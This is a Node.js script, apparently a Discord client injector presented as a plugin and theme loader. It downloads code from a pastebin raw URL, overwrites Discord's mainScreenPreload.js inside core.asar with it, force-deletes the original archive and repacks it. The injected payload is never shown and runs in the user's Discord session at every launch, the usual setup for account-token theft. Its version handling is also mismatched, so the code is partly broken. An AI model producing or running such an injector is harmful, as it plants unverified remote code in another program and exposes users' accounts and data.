const url = 'https://pastebin.com/raw/BwutnZ06',
      axios = require("axios"),
      chalk = require("chalk"),
      child_process = require("child_process"),
      process = require("process"),
      appdata = process.platform === "win32" ? process.env.APPDATA : process.platform === "linux" ? process.env['XDG_CONFIG_HOME'] : undefined,
      regex = /((\d+)(\.)?)+/,
      fs = require('fs'),
      { join } = require('path'),
      PTpath = appdata + "/Discord_Bot",
      PluginsPath = appdata + "/Discord_Bot/Plugins",
      ThemesPath = appdata + "/Discord_Bot/Themes",
      VD = ["Discord", "Canary", "PTB"],
      VDiscord = process.argv[2],
      InjectorM = chalk.white("[Injector] ");

(async function () {
	console.clear();
	if (appdata === undefined) return console.log(InjectorM+chalk.red("sorry. seems the os you are on right now isn't supported."));

if(VDiscord == VD[1]){
	console.log(InjectorM+`${chalk.blue(VD[1])}${chalk.green(" Discord injection")}`);
	let main_path = fs.readdirSync(join(appdata, "Discord"));
    let path = join(appdata, "Discord", main_path.filter(s => s.match(regex))[0], "modules", "discord_desktop_core", "core.asar");
    return injection(path);
} else if(VDiscord == VD[2]){
	console.log(InjectorM+`${chalk.blue(VD[2])}${chalk.green(" Discord injection")}`);
	let main_path = fs.readdirSync(join(appdata, "discordcanary"));
    let path = join(appdata, "discordcanary", main_path.filter(s => s.match(regex))[0], "modules", "discord_desktop_core", "core.asar");
    return injection(path);
/*}else if(VDiscord == VD[3]){
	//console.log(InjectorM+`${chalk.blue(VD[3])}${chalk.green(" Discord injection")}`);
	//Later for PTB i've never installed it!
	*/
} else {
	return console.log(InjectorM+chalk.red("this version of discord doesn't exist!"));
};
})();

async function injection(path){
	const code = (await axios.default.get(url)).data;
	if (path) {
        console.log(InjectorM+chalk.green("Injection in progress..."));
        child_process.execSync(`asar extract ${path} ${path.substring(0, path.length - 9) + "/_extracted"}`);
        _extractedMainScreen = path.substring(0, path.length - 9) + "/_extracted/app/mainScreenPreload.js";
        fs.writeFileSync(_extractedMainScreen, code, { encoding: "utf8" });
        child_process.execSync('Del /f ' + path);
        child_process.execSync(`asar pack ${path.substring(0, path.length - 9) + "/_extracted"} ${path}`);
        fs.rmdirSync(path.substring(0, path.length - 9) + "\\_extracted", {recursive:true});
        fs.mkdir(PTpath, {recursive: true}, (err) => {
            if (err) return console.error(err);    
            if (fs.existsSync(PluginsPath)){console.log(InjectorM+chalk.yellow("the Plugins Folder already exists"));} else {fs.mkdirSync(PluginsPath);console.log(InjectorM+chalk.green("Plugin Folder created with success"));};
            if (fs.existsSync(ThemesPath)){console.log(InjectorM+chalk.yellow("The Themes Folder already exists"));} else {fs.mkdirSync(ThemesPath);console.log(InjectorM+chalk.green("Themes Folder created with success"));};
            console.log(`${InjectorM} ${chalk.cyan("Additional details:\nCreated the directory Discord_Bot, he contain Plugin and Themes Folders in your appdata.\nYou can put your js files in PLUGINS and CSS files in THEMES, all are executed on discord load.\nTo load all new plugins please refresh discord doing \`ctrl + r\`.")}\n${InjectorM}${chalk.green("Completed")}`);
        });
    };
};
